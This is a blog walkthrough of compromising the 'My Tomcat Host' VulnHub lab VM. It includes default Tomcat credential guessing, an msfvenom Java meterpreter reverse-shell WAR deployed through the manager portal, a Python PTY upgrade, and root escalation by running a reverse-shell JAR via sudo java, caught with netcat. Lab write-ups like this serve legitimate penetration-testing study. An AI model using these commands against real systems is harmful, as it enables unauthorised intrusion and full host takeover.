<html>

<?php include '../header.php';?>

<body>

<?php include '../navbar.php';?>

    <div class="body-content">
        <h2>
            My Tomcat Host
        </h2>
        <img class="headerpic" src="http://placekitten.com/100/100" alt="Hack the Planet" height="200px" width="300px" align="middle" align="left">
        <p class="date">2020-04-11</p>
        <p class="text">
            This VM was created by <a href="https://twitter.com/akankshavermasv">Akanksha Sachin Verma</a>. I saw it on Vulnhub and was able to get through it fairly quickly.  It helped that I was familiar with the initial exploitation vector.  The VM came packaged configured for 4GB, but I dropped it down to 2GB without significant performance issues.  The VM can be downloaded:<a href="https://www.vulnhub.com/entry/my-tomcat-host-1,457/">here</a>.
        </p>
        <p class="text">
            First, I ran my (bash) enumeration script and examined the nmap scan.  I've updated this a bit and it has turned out nicely.  Now, it echoes the open ports that are found.  Pretty nice, huh?
        </p>
        <pre>
    root@kali:~/Documents/mytomcathost# ../scripts/enum-automation.sh 192.168.0.123
    Initial Host Enumeration Script
    by Cary Hooper @nopantrootdance
        [*] Beginning nmap scan of target.
    [!] Detected HTTP/HTTPS
    [!] Port 8080 is a web service
        [*] Starting nikto against port 8080
        [*] Starting dirb against port 8080
    [*] Starting nmap NSE scan
    [*] Starting nmap UDP scan
    22/tcp   open  ssh     OpenSSH 6.6.1 (protocol 2.0)
    8080/tcp open  http    Apache Tomcat 9.0.31

    Program Complete
        </pre>
        <p class="text">
            So there isn't much attack surface here.  Based on the OpenSSH version, I don't think theres much we can enumerate.  It isn't vulnerable to user enumeration, but if we attempt to log in with any username/password, we can see the banner and figure out if username/password authentication is enabled.  Typically, if the server responds IMMEDIATELY with an "Access Denied" message, I know that public key authentication is strictly enabled. 
        </p>
        <pre>
    root@kali:~/Documents/mytomcathost# ssh root@192.168.0.123
       ##############################################################################################
       #                                      Armour Infosec                                        #
       #                         --------- www.armourinfosec.com ------------                       #
       #                                    My Tomcat Host                                          #
       #                               Designed By  :- Akanksha Sachin Verma                        #
       #                               Twitter      :- @akankshavermasv                             #
       ##############################################################################################
    root@192.168.0.123: Permission denied (publickey,gssapi-keyex,gssapi-with-mic).
        </pre>
        <p class="text">
            Other than that, then I started focusing on the Tomcat Server.  Before even looking at the results of dirb and nikto, I navigated to the Tomcat landing page at port 8080 (TCP) and attempted to log into the Tomcat manager portal located at /manager/html.  Typically, I don't like brute-forcing so early in the assessment, but for Tomcat, I make an exception.  I've seen username/password combinations such as admin:admin, tomcat:tomcat, manager:manager, tomcat:manager, and a few others.  I tried these immediately because of the high-value target that I know lies behind the basic authentication.  Sure enough, tomcat:tomcat authenticated me to the machine.  This gave me the traditional Tomcat manager portal, where I could upload my own servlet in the form of a WAR file (which is basically a Java archive / zip file).  Fun fact: you can unpack a war with the "unzip" utility.  I used a relatively new addition to the Metasploit framework, which is a Java-targeted meterpreter shell, which is pretty handy when you're not sure whether the host is Windows or Linux-based (this can be hard when the host is behind a load balancer or firewall).  
        </p>
        <pre>
    root@kali:~/Documents/mytomcathost# msfvenom -p java/meterpreter/reverse_tcp LHOST=192.168.0.122 LPORT=443 -f war -o msf443.war
    Payload size: 6262 bytes
    Final size of war file: 6262 bytes
    Saved as: msf443.war

    msf5 exploit(multi/handler) > exploit

    [*] Started reverse TCP handler on 192.168.0.122:443 
    [*] Sending stage (53906 bytes) to 192.168.0.123
    [*] Meterpreter session 4 opened (192.168.0.122:443 -> 192.168.0.123:44180) at 2020-04-11 10:17:13 -0400

    meterpreter > 
        </pre>
        <p class="text">
            I uploaded msf443.war to the Tomcat manager page, then browsed to the servlet at http://192.168.0.123/msf443/ to invoke the Java code, catching the reverse meterpreter shell with Metasploit's multi/handler module.  Wow!  53,906 bytes for a meterpreter payload is HUGE.  I'm not a huge fan of Java, but I hope to be someday.  Right now, .NET Core C# is winning the race for my heart.  After a couple of times trying to spawn a "shell", I noticed that I was immediately kicked off.  Taking a look at /etc/passwd, it appeared that because I was the user "tomcat", I could not load a shell (/sbin/nologin).
        </p>
        <pre>
    meterpreter > cat /etc/passwd 
    root:x:0:0:root:/root:/bin/bash
    bin:x:1:1:bin:/bin:/sbin/nologin
    daemon:x:2:2:daemon:/sbin:/sbin/nologin
    adm:x:3:4:adm:/var/adm:/sbin/nologin
    lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
    sync:x:5:0:sync:/sbin:/bin/sync
    shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
    halt:x:7:0:halt:/sbin:/sbin/halt
    mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
    operator:x:11:0:operator:/root:/sbin/nologin
    games:x:12:100:games:/usr/games:/sbin/nologin
    ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
    nobody:x:99:99:Nobody:/:/sbin/nologin
    avahi-autoipd:x:170:170:Avahi IPv4LL Stack:/var/lib/avahi-autoipd:/sbin/nologin
    dbus:x:81:81:System message bus:/:/sbin/nologin
    polkitd:x:999:998:User for polkitd:/:/sbin/nologin
    tss:x:59:59:Account used by the trousers package to sandbox the tcsd daemon:/dev/null:/sbin/nologin
    postfix:x:89:89::/var/spool/postfix:/sbin/nologin
    sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
    tomcat:x:998:997::/usr/local/tomcat9/:/sbin/nologin
    systemd-network:x:192:192:systemd Network Management:/:/sbin/nologin
        </pre>
        <p class="text">
            Now, I know there are some ways around this, but I already had a meterpreter shell, which was good enough for me.  The next thing I did was look at the running processes, explore the file system for anything that looked out of the ordinary, and try to find the $CATALINA_HOME folder, which is where the Tomcat configuration files and possibly web apps are stored.  Meterpreter has a builtin function "getenv" to see environment variables that are currently set.  This revealed that they were stored in the tomcat user's home folder, /usr/local/tomcat9.
        </p>
        <pre>
    meterpreter > getenv

    Environment Variables
    =====================

    Variable          Value
    --------          -----
    JDK_JAVA_OPTIONS  --add-opens=java.base/java.lang=ALL-UNNAMED --add-opens=java.base/java.io=ALL-UNNAMED --add-opens=java.rmi/sun.rmi.transport=ALL-UNNAMED
    JAVA_OPTS         -Djava.security.egd=file:///dev/urandom -Djava.awt.headless=true -Djdk.tls.ephemeralDHKeySize=2048 -Djava.protocol.handler.pkgs=org.apache.catalina.webresources -Dorg.apache.catalina.security.SecurityListener.UMASK=0027
    CATALINA_OPTS     -Xms512M -Xmx1024M -server -XX:+UseParallelGC
    PWD               /
    SHELL             /sbin/nologin
    JAVA_HOME         /usr/lib/jvm/java
    _                 /usr/lib/jvm/java/bin/java
    PATH              /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin
    <b>CATALINA_HOME     /usr/local/tomcat9/</b>
    CATALINA_BASE     /usr/local/tomcat9/
    HOME              /usr/local/tomcat9/
    CATALINA_PID      /usr/local/tomcat9/temp/tomcat.pid
    SHLVL             1
    LANG              en_US.UTF-8
    USER              tomcat
    LOGNAME           tomcat
        </pre>
        <p class="text">
            Immediately, I browsed to that folder for some juicy post-exploitation, but found what I already knew in the tomcat-users.xml file: that the Tomcat manager could be accessed with tomcat:tomcat.  I also found credentials to the Tomcat host-manager interface (admin:admin), but this didn't grant me additional privileges.  However, I did notice there was a .bash_history file within the tomcat user's home.  I've never seen this before and it was weird because the tomcat user's default shell was not /bin/bash, but was /sbin/nologin.
        </p>
        <pre>
    meterpreter > ls
    Listing: /usr/local/tomcat9
    ===========================

    Mode              Size   Type  Last modified              Name
    ----              ----   ----  -------------              ----
    100667/rw-rw-rwx  242    fil   2020-03-22 05:47:43 -0400  .bash_history
    100666/rw-rw-rw-  18982  fil   2020-02-05 14:36:14 -0500  BUILDING.txt
    100666/rw-rw-rw-  5409   fil   2020-02-05 14:36:14 -0500  CONTRIBUTING.md
    100666/rw-rw-rw-  57092  fil   2020-02-05 14:36:14 -0500  LICENSE
    100666/rw-rw-rw-  2333   fil   2020-02-05 14:36:14 -0500  NOTICE
    100666/rw-rw-rw-  3255   fil   2020-02-05 14:36:14 -0500  README.md
    100666/rw-rw-rw-  6898   fil   2020-02-05 14:36:14 -0500  RELEASE-NOTES
    100666/rw-rw-rw-  16262  fil   2020-02-05 14:36:14 -0500  RUNNING.txt
    40776/rwxrwxrw-   4096   dir   2020-03-22 02:38:33 -0400  bin
    40776/rwxrwxrw-   4096   dir   2020-03-22 02:47:00 -0400  conf
    40776/rwxrwxrw-   4096   dir   2020-03-22 02:38:33 -0400  lib
    40776/rwxrwxrw-   4096   dir   2020-04-10 11:53:51 -0400  logs
    40776/rwxrwxrw-   4096   dir   2020-04-10 11:57:59 -0400  temp
    40776/rwxrwxrw-   134    dir   2020-04-10 11:56:44 -0400  webapps
    40776/rwxrwxrw-   21     dir   2020-03-22 02:39:44 -0400  work

    meterpreter > cat .bash_history
    id
    tty
    cat /etc/profile; cat /etc/bashrc; cat ~/.bash_profile; cat ~/.bashrc; cat ~/.bash_logout; env; set
    id
    export PS1='[\u@\h \W]\$ '
    id
    sh
    id
    tty
    sudo -l
    sudo /usr/lib/jvm/java-1.8.0-openjdk-1.8.0.242.b08-0.el7_7.x86_64/jre/bin/java
    exit
        </pre>
        <p class="text">
            This gave us a very important clue.  It appears that the user tomcat can possibly execute some commands (Java, maybe?) as root.  I can't execute interactive commands without spawning a bash shell so next I tried to do just that.  Let's get interactive!  I tried for a bit to generate an SSH key and/or add my own to a ".ssh/authorized_keys" folder, but was unable to grab an interactive shell through SSH.  Then, I tried the next best thing.
        </p>   
        <pre>
    meterpreter > execute -f bash -i -H "whoami"
    Process 4 created.
    Channel 11 created.
    id
    uid=998(tomcat) gid=997(tomcat) groups=997(tomcat)
    python --version
    python3 --version
    which python
    /usr/bin/python
    /usr/bin/python -c 'import pty;pty.spawn("/bin/bash");'
    bash-4.2$ export TERM=xterm-256color
    export TERM=xterm-256color
    bash-4.2$ sudo -l
    sudo -l
    Matching Defaults entries for tomcat on this host:
        requiretty, !visiblepw, always_set_home, env_reset, env_keep="COLORS
        DISPLAY HOSTNAME HISTSIZE INPUTRC KDEDIR LS_COLORS", env_keep+="MAIL PS1
        PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE", env_keep+="LC_COLLATE
        LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES", env_keep+="LC_MONETARY
        LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE", env_keep+="LC_TIME LC_ALL
        LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
        secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

    User tomcat may run the following commands on this host:
        (ALL) NOPASSWD:
        /usr/lib/jvm/java-1.8.0-openjdk-1.8.0.242.b08-0.el7_7.x86_64/jre/bin/java
        </pre>
        <p class="text">
            So I was able to spawn a bash shell by using meterpreter's "execute" command.  I believe only the -i (interactive) was necessary.  Then, I used Python to spawn a PTY bash shell and exported the TERM environment variable so I could give commands like "clear" to clear the terminal screen.  This was a pretty good shell, but unfortunately, I can't use the arrow keys to edit typed commands.  It will be OK for now.  Of course, something interesting popped up when running "sudo -l".  It appeared that the tomcat user could run "java" as root!  I knew this could be used to escalate privileges to root, but I have never exploited (or read about exploiting) this.  First, I navigated to an amazing sudo cheat sheet <a href="https://gtfobins.github.io/">GTFOBins</a> and was surprised that they didn't have exploitation guidance for Java.  After a bit of research (I'm quite unfamiliar with Java though I do have some experience with it) and experimenting, I tried compiling a Java program into a Class file, but what ultimately ended up working was using Java to invoke a JAR file.   How could I forget this method?!  I use java -jar --program-- all the time, especially when invoking Burp Suite from the command line.  Immediately, I remembered that msfvenom could create a malicious JAR reverse shell, which was quite convenient.  I generated a payload with msfvenom, uploaded it to the remote server, then ran Java with sudo privileges (as root) to execute a reverse shell.
        </p>
        <pre>
    bash-4.2$ sudo /usr/lib/jvm/java-1.8.0-openjdk-1.8.0.242.b08-0.el7_7.x86_64/jre/bin/java -jar shell5555.jar
    bin/java -jar shell5555.jar0-openjdk-1.8.0.242.b08-0.el7_7.x86_64/jre/ 
        </pre>
        <p class="text">
            Within my attacking machine's terminal, here we see me catching the reverse shell:
        </p>
        <pre>
    root@kali:~/Documents/mytomcathost# nc -nlvp 5555
    Listening on 0.0.0.0 5555
    Connection received on 192.168.0.123 51698
    id
    uid=0(root) gid=0(root) groups=0(root)
    cd /root
    ls
    proof.txt
    cat proof.txt
    Best of Luck
    628435356e49f976bab2c04948d22fe4
    hostname
    my_tomcat
        </pre>
        <p class="text">
            Not a bad box at all!  It definitely made me squirm a bit when I saw that I'd need to use Java to escalate privileges to root.  This is certainly one of the easier VulnHub boxes I completed, but I'm grateful to have rooted this one.  I was reminded of the versatility of Java and surprised that nobody has added java into the GTFOBins repository.  
        </p>
    </div>
</body>
<?php include '../footer.php';?>
</html>
